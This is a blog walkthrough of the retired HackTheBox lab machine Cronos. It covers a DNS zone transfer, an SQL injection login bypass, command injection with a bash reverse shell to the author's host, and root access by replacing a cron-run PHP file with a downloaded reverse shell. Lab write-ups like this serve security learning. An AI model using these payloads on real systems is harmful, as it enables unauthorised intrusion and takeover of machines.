---
title: Cronos - HackTheBox Walkthrough
author: Degr4ne
date: 2021-10-24 12:00:00 
categories: [HackTheBox,Linux]
tags: [dns,zone transfer,sqli,pspy]
math: false
mermaid: false
image:
  src: /assets/img/HTB/Cronos/00-banner.png
  width: 595
  height: 377
---
Hello guys, welcome back with another walkthrough, this time we'll be doing `Cronos` a retired linux machine from HackTheBox rated medium. Without further ado, let’s begin.
# Recon
## Nmap Scan
As always we'll start with a nmap scan to discover the open ports and services.
```console
$ cat nmap-scan
# Nmap 7.91 scan initiated Sat Oct 23 06:45:17 2021 as: nmap -sC -sV -v -oN nmap-scan 10.129.241.243
Nmap scan report for 10.129.241.243
Host is up (0.13s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 23 06:45:42 2021 -- 1 IP address (1 host up) scanned in 25.24 seconds
```
Three ports are open: `22:ssh`,`53:domain` and `80:http`.
## Port 53 - domain
DNS service is running on the victim machine. We can try for a `dns zone transfer` and if we succeed may get some subdomains of the domain `cronos.htb`.

```console
$ dig @10.129.241.243 axfr cronos.htb
; <<>> DiG 9.16.15-Debian <<>> @10.129.241.243 axfr cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.129.241.243
admin.cronos.htb.	604800	IN	A	10.129.241.243
ns1.cronos.htb.		604800	IN	A	10.129.241.243
www.cronos.htb.		604800	IN	A	10.129.241.243
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 120 msec
;; SERVER: 10.129.241.243#53(10.129.241.243)
;; WHEN: Sat Oct 23 06:51:42 -05 2021
;; XFR size: 7 records (messages 1, bytes 203)
```

![01-dig](/assets/img/HTB/Cronos/01-dig.png)

We got **three new subdomains** namely `admin.cronos.htb`, `ns1.cronos.htb`  and `www.cronos.htb`. Added these domains to my `/etc/hosts` file.
```console
$ sudo echo "10.129.241.243 cronos.htb admin.cronos.htb ns1.cronos.htb www.cronos.htb" >> /etc/hosts
```

## HTTP Enumeration
### Cronos.htb
Hitting `http://cronos.htb` lead to a page with some links to a external site.

![02-web](/assets/img/HTB/Cronos/02-web.png)

Also `gobuster` no returns any interesting directory or file.

## admin.cronos.htb

The next domain to enumerate is `admin.cronos.htb`, it's a login page which the common credentials(`admin/admin`,`admin/cronos`,etc) didn't work

![03-web](/assets/img/HTB/Cronos/03-web.png)

But, good old sqli nothing beats that.
`admin' or 1=1-- -`

![04-sqli](/assets/img/HTB/Cronos/04-sqli.png)

After bypass the login, we are presented with a page that is vulnerable to a command injection.

![05-whoami](/assets/img/HTB/Cronos/05-whoami.png)

With the next input we can get a reverse shell on our netcat listener port:

```plaintext
localhost | bash -c "bash -i >& /dev/tcp/10.10.14.34/443 0>&1"
```

![06-shell](/assets/img/HTB/Cronos/06-shell.png)

To upgrade the shell:
```console
$ python -c "import pty;pty.spawn('/bin/bash')"
$ ^Z
$ stty raw -echo; fg
$   reset
$ export TERM=xterm
$ export TERM=bash
```

# Privilage Escalation
I didn't find anything useful with `sudo -l` or searching SUID files, that's why I decided use [pspy](https://github.com/DominicBreuker/pspy/releases) to monitor the processes running on the machine.

![07-pspy](/assets/img/HTB/Cronos/07-pspy.png)

It seems that root is executing a php file named `artisan` periodically, let's replace it with a [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

```
$ wget http://10.10.14.34/php-reverse-shell.php
$ cat php-reverse-shell.php > artisan
```
Once we tranfered the file and changed the content of artisan, we recived a shell as root!!!

![08-root](/assets/img/HTB/Cronos/08-root.png)

That’s it for now guys. Until next time.
